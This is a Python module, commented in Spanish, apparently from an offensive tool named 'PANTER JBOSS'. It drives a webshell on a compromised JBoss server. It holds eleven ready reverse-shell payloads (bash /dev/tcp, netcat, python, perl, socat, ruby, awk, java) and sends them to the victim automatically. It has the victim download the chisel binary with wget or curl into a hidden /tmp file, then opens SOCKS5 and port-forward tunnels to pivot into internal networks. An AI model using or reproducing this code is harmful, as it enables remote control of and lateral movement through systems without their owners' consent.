# -*- coding: utf-8 -*-
"""
PANTER JBOSS - Modulo de Pivoting y Reverse Shell
Analyst : Apo1o13
Build   : 2026-04-30

Tunneling via Chisel, reverse shells automaticos y upgrade de TTY.
Todo se ejecuta a traves de la webshell del JBoss comprometido.
"""

import re
import sys
import os
import subprocess
import socket
import threading

try:
    from urllib.parse import urlencode
except ImportError:
    from urllib import urlencode

RED    = '\x1b[91m'
GREEN  = '\033[32m'
BOLD   = '\033[1m'
ENDC   = '\033[0m'
YELLOW = '\033[93m'
CYAN   = '\033[96m'
WHITE  = '\033[97m'
MAGENTA= '\033[95m'


def _p(msg, end='\n'):
    sys.stdout.write(msg + end)
    sys.stdout.flush()


def _exec(http_pool, url, path, headers, cmd, timeout=25):
    try:
        encoded = urlencode({"ppp": cmd})
        r = http_pool.request('GET', url + path + encoded,
                              redirect=False, headers=headers)
        if r.status == 404:
            return ""
        resp = r.data.decode('utf-8', errors='ignore')
        try:
            out = resp.split("pre>")[1]
            out = re.sub(r'</?\w+[^>]*>', '', out)
            return out.replace('\\n', '\n').replace('\\t', '\t').strip()
        except:
            return ""
    except:
        return ""


def _get_kali_ip(http_pool, url, path, headers):
    """Detecta la IP de Kali que el servidor ve (IP de la conexion entrante)."""
    # Intentar desde el lado del servidor
    out = _exec(http_pool, url, path, headers,
                "echo $SSH_CLIENT; echo $SSH_CONNECTION; "
                "netstat -tn 2>/dev/null | grep ESTABLISHED | head -3")
    # Intentar obtener la IP local de Kali
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return ""


# ══════════════════════════════════════════════════════════
#  REVERSE SHELLS
# ══════════════════════════════════════════════════════════

REVERSE_SHELLS = {
    "bash": (
        "bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1' &"
    ),
    "bash_196":  (
        "0<&196;exec 196<>/dev/tcp/{ip}/{port}; sh <&196 >&196 2>&196 &"
    ),
    "python3": (
        "python3 -c \"import socket,os,pty;"
        "s=socket.socket();s.connect(('{ip}',{port}));"
        "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);"
        "os.dup2(s.fileno(),2);pty.spawn('/bin/bash')\" &"
    ),
    "python2": (
        "python -c \"import socket,subprocess,os;"
        "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
        "s.connect(('{ip}',{port}));"
        "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);"
        "os.dup2(s.fileno(),2);"
        "subprocess.call(['/bin/sh','-i'])\" &"
    ),
    "perl": (
        "perl -e 'use Socket;"
        "$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
        "connect(S,sockaddr_in($p,inet_aton($i)));"
        "STDIN->fdopen(S,r);$~->fdopen(S,w);"
        "system$_ while<>;' &"
    ),
    "nc_e": (
        "nc -e /bin/bash {ip} {port} &"
    ),
    "nc_mkfifo": (
        "rm /tmp/.f;mkfifo /tmp/.f;"
        "cat /tmp/.f|/bin/bash -i 2>&1|nc {ip} {port} >/tmp/.f &"
    ),
    "java_runtime": (
        "r = Runtime.getRuntime();"
        "p = r.exec([\"/bin/bash\",\"-c\","
        "\"exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; "
        "do \\$line 2>&5 >&5; done\"] as String[]);"
        "p.waitFor();"
    ),
    "socat_tty": (
        "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{ip}:{port} &"
    ),
    "ruby": (
        "ruby -rsocket -e 'exit if fork;"
        "c=TCPSocket.new(\"{ip}\",\"{port}\");"
        "while(cmd=c.gets);IO.popen(cmd,\"r\"){{|io|c.print io.read}}end' &"
    ),
    "awk": (
        "awk 'BEGIN{{s=\"/inet/tcp/0/{ip}/{port}\";"
        "while(1){{do{{printf \"> \" |& s; s |& getline c;"
        "while ((c |& getline line) > 0) print line |& s;"
        "close(c)}}while(c != \"exit\")}}}}' &"
    ),
}

TTY_UPGRADES = [
    ("Python PTY (recomendado)",
     "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'  # luego Ctrl+Z\n"
     "stty raw -echo; fg\n"
     "reset\n"
     "export TERM=xterm SHELL=bash"),
    ("Script TTY",
     "script /dev/null -c bash  # luego Ctrl+Z\n"
     "stty raw -echo; fg"),
    ("Socat TTY completo (en Kali primero)",
     "socat file:`tty`,raw,echo=0 tcp-listen:{port}   # kali\n"
     "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{ip}:{port}  # victima"),
]


def _imprimir_shells(ip, port):
    _p(CYAN + BOLD +
       "\n  ╔══════════════════════════════════════════════════════════╗\n"
       "  ║         PAYLOADS DE REVERSE SHELL DISPONIBLES            ║\n"
       "  ╚══════════════════════════════════════════════════════════╝\n" + ENDC)

    for i, (nombre, template) in enumerate(REVERSE_SHELLS.items(), 1):
        payload = template.format(ip=ip, port=port)
        _p(YELLOW + BOLD + "  [%d] %s:" % (i, nombre.upper()) + ENDC)
        _p(WHITE + "      " + payload + ENDC)
        _p("")


def _lanzar_reverse_shell(http_pool, url, path, headers, shell_type, ip, port):
    template = REVERSE_SHELLS.get(shell_type)
    if not template:
        _p(RED + "  [!] Tipo de shell no encontrado." + ENDC)
        return False

    payload = template.format(ip=ip, port=port)
    _p(GREEN + "\n  [*] Enviando payload %s → %s:%s..." % (shell_type, ip, port) + ENDC)
    _p(YELLOW + "  [*] Inicia listener ANTES de continuar:" + ENDC)
    _p(WHITE + "      nc -lvnp %s" % port + ENDC)
    _p(WHITE + "      # o para TTY: rlwrap nc -lvnp %s" % port + ENDC + "\n")

    input(YELLOW + BOLD + "  Presiona ENTER cuando el listener este listo... " + ENDC)

    out = _exec(http_pool, url, path, headers, payload, timeout=5)
    _p(GREEN + "  [*] Payload enviado. Revisa tu listener." + ENDC)
    if out:
        _p(CYAN + "  Output: " + out[:200] + ENDC)
    return True


# ══════════════════════════════════════════════════════════
#  CHISEL — TUNNELING
# ══════════════════════════════════════════════════════════

CHISEL_URLS = {
    "linux_amd64": "https://github.com/jpillora/chisel/releases/latest/download/chisel_linux_amd64.gz",
    "linux_arm64": "https://github.com/jpillora/chisel/releases/latest/download/chisel_linux_arm64.gz",
    "linux_386":   "https://github.com/jpillora/chisel/releases/latest/download/chisel_linux_386.gz",
}


def _detectar_arch(http_pool, url, path, headers):
    out = _exec(http_pool, url, path, headers, "uname -m")
    if not out:
        return "linux_amd64"
    out = out.strip().lower()
    if "aarch64" in out or "arm64" in out:
        return "linux_arm64"
    if "i686" in out or "i386" in out:
        return "linux_386"
    return "linux_amd64"


def _chisel_disponible(http_pool, url, path, headers):
    out = _exec(http_pool, url, path, headers,
                "which chisel 2>/dev/null; [ -f /tmp/.chisel ] && echo /tmp/.chisel")
    return bool(out and ('chisel' in out or '/tmp/' in out))


def _subir_chisel(http_pool, url, path, headers, kali_ip, kali_port_http=8000):
    """
    Sube chisel al servidor via wget/curl desde un servidor HTTP temporal en Kali.
    El operador debe tener chisel en el directorio actual o en /tmp/.
    """
    arch = _detectar_arch(http_pool, url, path, headers)
    _p(CYAN + "\n  [CHISEL] Arquitectura detectada: %s" % arch + ENDC)

    # Verificar si ya existe chisel local
    chisel_local = None
    for nombre in ['chisel', 'chisel_linux_amd64', './chisel']:
        if os.path.exists(nombre):
            chisel_local = nombre
            break

    if not chisel_local:
        _p(YELLOW +
           "\n  [CHISEL] No se encontro chisel local. Instrucciones para obtenerlo:\n"
           "  apt install chisel  # Kali 2023+\n"
           "  # o descargar desde: https://github.com/jpillora/chisel/releases\n" + ENDC)
        chisel_local = input(YELLOW + "  Ruta al binario chisel local (Enter para omitir): " + ENDC).strip()
        if not chisel_local or not os.path.exists(chisel_local):
            _p(RED + "  [!] Chisel no disponible. Abortando subida." + ENDC)
            return False

    _p(GREEN + "\n  [CHISEL] Iniciando servidor HTTP temporal en Kali (puerto %d)..." % kali_port_http + ENDC)
    _p(WHITE + "  Ejecuta en otra terminal: python3 -m http.server %d" % kali_port_http + ENDC)
    _p(WHITE + "  (en el mismo directorio donde esta chisel)" + ENDC)
    input(YELLOW + "  Presiona ENTER cuando el servidor HTTP este corriendo... " + ENDC)

    # Intentar descarga en el servidor victima
    chisel_name = os.path.basename(chisel_local)
    cmds_descarga = [
        "wget -q http://%s:%d/%s -O /tmp/.chisel 2>/dev/null && chmod +x /tmp/.chisel && echo OK" % (
            kali_ip, kali_port_http, chisel_name),
        "curl -s http://%s:%d/%s -o /tmp/.chisel 2>/dev/null && chmod +x /tmp/.chisel && echo OK" % (
            kali_ip, kali_port_http, chisel_name),
    ]

    for cmd in cmds_descarga:
        out = _exec(http_pool, url, path, headers, cmd, timeout=30)
        if out and 'OK' in out:
            _p(GREEN + BOLD + "  [CHISEL] Chisel subido exitosamente a /tmp/.chisel" + ENDC)
            return True

    _p(RED + "  [!] No se pudo subir chisel (wget/curl fallaron)." + ENDC)
    return False


def _menu_chisel(http_pool, url, path, headers, kali_ip):
    _p(CYAN + BOLD +
       "\n  ╔══════════════════════════════════════════════════════════╗\n"
       "  ║                   MENU CHISEL                            ║\n"
       "  ╠══════════════════════════════════════════════════════════╣\n" + ENDC +
       GREEN +
       "  ║  [1] SOCKS5 proxy (acceso a red interna via proxychains)  ║\n"
       "  ║  [2] Port forward local → servicio interno                ║\n"
       "  ║  [3] Port forward inverso (remote → kali)                 ║\n"
       "  ║  [4] Verificar / subir chisel al servidor                 ║\n"
       "  ║  [0] Volver                                               ║\n" + ENDC +
       CYAN + BOLD +
       "  ╚══════════════════════════════════════════════════════════╝\n" + ENDC)

    opcion = input(YELLOW + BOLD + "  Opcion chisel: " + ENDC).strip()

    if opcion == "0":
        return

    elif opcion == "4":
        puerto_http = input(YELLOW + "  Puerto servidor HTTP en Kali [8000]: " + ENDC).strip()
        puerto_http = int(puerto_http) if puerto_http.isdigit() else 8000
        _subir_chisel(http_pool, url, path, headers, kali_ip, puerto_http)

    elif opcion == "1":
        puerto_chisel = input(YELLOW + "  Puerto chisel server en Kali [1080]: " + ENDC).strip()
        puerto_chisel = puerto_chisel if puerto_chisel.isdigit() else "1080"
        puerto_socks  = input(YELLOW + "  Puerto SOCKS5 en Kali [9050]: " + ENDC).strip()
        puerto_socks  = puerto_socks if puerto_socks.isdigit() else "9050"

        _p(RED + BOLD +
           "\n  [1] Ejecuta en Kali (servidor):\n" + ENDC +
           WHITE + "      chisel server -p %s --reverse --socks5\n" % puerto_chisel + ENDC)

        _p(RED + BOLD +
           "  [2] El siguiente comando se enviara a la victima:\n" + ENDC)

        cmd_victima = ("/tmp/.chisel client %s:%s R:socks &" % (kali_ip, puerto_chisel))
        _p(WHITE + "      " + cmd_victima + ENDC)

        if not _chisel_disponible(http_pool, url, path, headers):
            _p(YELLOW + "\n  [!] Chisel no encontrado en /tmp/.chisel — suba primero con opcion [4]" + ENDC)
            return

        input(YELLOW + "\n  Presiona ENTER cuando el servidor chisel este corriendo en Kali... " + ENDC)
        out = _exec(http_pool, url, path, headers, cmd_victima, timeout=8)

        _p(GREEN + BOLD + "\n  [+] Chisel lanzado en el servidor." + ENDC)
        _p(MAGENTA + BOLD +
           "\n  Configura proxychains en Kali:\n" + ENDC +
           WHITE +
           "  /etc/proxychains4.conf (o proxychains.conf):\n"
           "    socks5 127.0.0.1 %s\n\n"
           "  Uso:\n"
           "    proxychains nmap -sV -Pn <ip_interna>\n"
           "    proxychains curl http://<ip_interna>:<puerto>\n"
           "    proxychains ssh usuario@<ip_interna>\n" % puerto_socks + ENDC)

    elif opcion == "2":
        puerto_local   = input(YELLOW + "  Puerto local en Kali [8888]: " + ENDC).strip() or "8888"
        ip_remota      = input(YELLOW + "  IP interna destino: " + ENDC).strip()
        puerto_remoto  = input(YELLOW + "  Puerto destino: " + ENDC).strip()
        puerto_chisel  = input(YELLOW + "  Puerto chisel server en Kali [1080]: " + ENDC).strip() or "1080"

        _p(RED + BOLD + "\n  [1] Ejecuta en Kali:\n" + ENDC +
           WHITE + "      chisel server -p %s --reverse\n" % puerto_chisel + ENDC)

        cmd_victima = ("/tmp/.chisel client %s:%s R:%s:%s:%s &" % (
            kali_ip, puerto_chisel, puerto_local, ip_remota, puerto_remoto))

        _p(RED + BOLD + "  [2] Enviando a victima:\n" + ENDC +
           WHITE + "      " + cmd_victima + ENDC)

        if not _chisel_disponible(http_pool, url, path, headers):
            _p(YELLOW + "\n  [!] Chisel no encontrado — suba primero con opcion [4]" + ENDC)
            return

        input(YELLOW + "\n  Presiona ENTER cuando el servidor chisel este corriendo... " + ENDC)
        _exec(http_pool, url, path, headers, cmd_victima, timeout=8)

        _p(GREEN + BOLD +
           "\n  [+] Forward activo. Conectate desde Kali a:\n" + ENDC +
           WHITE +
           "      localhost:%s  →  %s:%s (via tunel)" % (puerto_local, ip_remota, puerto_remoto) + ENDC)

    elif opcion == "3":
        puerto_kali    = input(YELLOW + "  Puerto en Kali a exponer [4444]: " + ENDC).strip() or "4444"
        puerto_chisel  = input(YELLOW + "  Puerto chisel server en Kali [1080]: " + ENDC).strip() or "1080"

        cmd_victima = ("/tmp/.chisel client %s:%s %s:127.0.0.1:%s &" % (
            kali_ip, puerto_chisel, puerto_kali, puerto_kali))

        _p(RED + BOLD + "\n  [1] Ejecuta en Kali:\n" + ENDC +
           WHITE + "      chisel server -p %s\n" % puerto_chisel + ENDC)

        _p(RED + BOLD + "  [2] Enviando a victima:\n" + ENDC +
           WHITE + "      " + cmd_victima + ENDC)

        if not _chisel_disponible(http_pool, url, path, headers):
            _p(YELLOW + "\n  [!] Chisel no encontrado — suba primero con opcion [4]" + ENDC)
            return

        input(YELLOW + "\n  Presiona ENTER cuando el servidor chisel este corriendo... " + ENDC)
        _exec(http_pool, url, path, headers, cmd_victima, timeout=8)
        _p(GREEN + BOLD + "\n  [+] Tunel reverso activo." + ENDC)


# ══════════════════════════════════════════════════════════
#  MENU PRINCIPAL DE PIVOT
# ══════════════════════════════════════════════════════════

def run_menu(http_pool, url, path, headers):
    """Menu principal del modulo de pivoting."""

    # Detectar IP de Kali
    kali_ip = _get_kali_ip(http_pool, url, path, headers)
    if not kali_ip:
        kali_ip_input = input(YELLOW + "  IP de Kali (tu maquina): " + ENDC).strip()
        if kali_ip_input:
            kali_ip = kali_ip_input

    while True:
        _p(CYAN + BOLD +
           "\n  ╔══════════════════════════════════════════════════════════╗\n"
           "  ║         MENU PIVOTING / REVERSE SHELL                   ║\n"
           "  ║  Kali IP: %-46s║\n" % ((kali_ip or "desconocida") + " ") +
           "  ╠══════════════════════════════════════════════════════════╣\n" + ENDC +
           RED + BOLD +
           "  ║  [1] Lanzar Reverse Shell automatico                     ║\n"
           "  ║  [2] Ver todos los payloads de reverse shell             ║\n" + ENDC +
           MAGENTA + BOLD +
           "  ║  [3] Chisel — Tunneling / SOCKS5 proxy                   ║\n" + ENDC +
           CYAN +
           "  ║  [4] Upgrade a TTY — instrucciones                       ║\n"
           "  ║  [5] Cambiar IP de Kali                                  ║\n"
           "  ║  [0] Volver                                              ║\n" + ENDC +
           CYAN + BOLD +
           "  ╚══════════════════════════════════════════════════════════╝\n" + ENDC)

        opcion = input(YELLOW + BOLD + "  Opcion: " + ENDC).strip()

        if opcion == "0":
            break

        elif opcion == "5":
            kali_ip = input(YELLOW + "  Nueva IP de Kali: " + ENDC).strip()

        elif opcion == "2":
            port = input(YELLOW + "  Puerto del listener [4444]: " + ENDC).strip() or "4444"
            _imprimir_shells(kali_ip, port)

        elif opcion == "1":
            _p(CYAN + BOLD + "\n  Tipos de shell disponibles:\n" + ENDC)
            tipos = list(REVERSE_SHELLS.keys())
            for i, t in enumerate(tipos, 1):
                _p(GREEN + "  [%d] %s" % (i, t) + ENDC)
            _p("")

            sel = input(YELLOW + "  Tipo [bash]: " + ENDC).strip()
            if sel.isdigit() and 1 <= int(sel) <= len(tipos):
                shell_type = tipos[int(sel) - 1]
            elif sel in REVERSE_SHELLS:
                shell_type = sel
            else:
                shell_type = "bash"

            ip   = input(YELLOW + "  IP listener [%s]: " % kali_ip + ENDC).strip() or kali_ip
            port = input(YELLOW + "  Puerto listener [4444]: " + ENDC).strip() or "4444"

            _lanzar_reverse_shell(http_pool, url, path, headers, shell_type, ip, port)

        elif opcion == "3":
            _menu_chisel(http_pool, url, path, headers, kali_ip)

        elif opcion == "4":
            port = input(YELLOW + "  Puerto de tu reverse shell (para socat): " + ENDC).strip() or "4444"
            _p(MAGENTA + BOLD +
               "\n  ╔══════════════════════════════════════════════════════════╗\n"
               "  ║           UPGRADE A TTY COMPLETO                         ║\n"
               "  ╚══════════════════════════════════════════════════════════╝\n" + ENDC)
            for nombre, instrucciones in TTY_UPGRADES:
                instrucciones = instrucciones.format(ip=kali_ip, port=port)
                _p(YELLOW + BOLD + "\n  [%s]" % nombre + ENDC)
                for linea in instrucciones.split('\n'):
                    _p(WHITE + "    " + linea + ENDC)
            _p("")

        else:
            _p(RED + "\n  [!] Opcion invalida.\n" + ENDC)
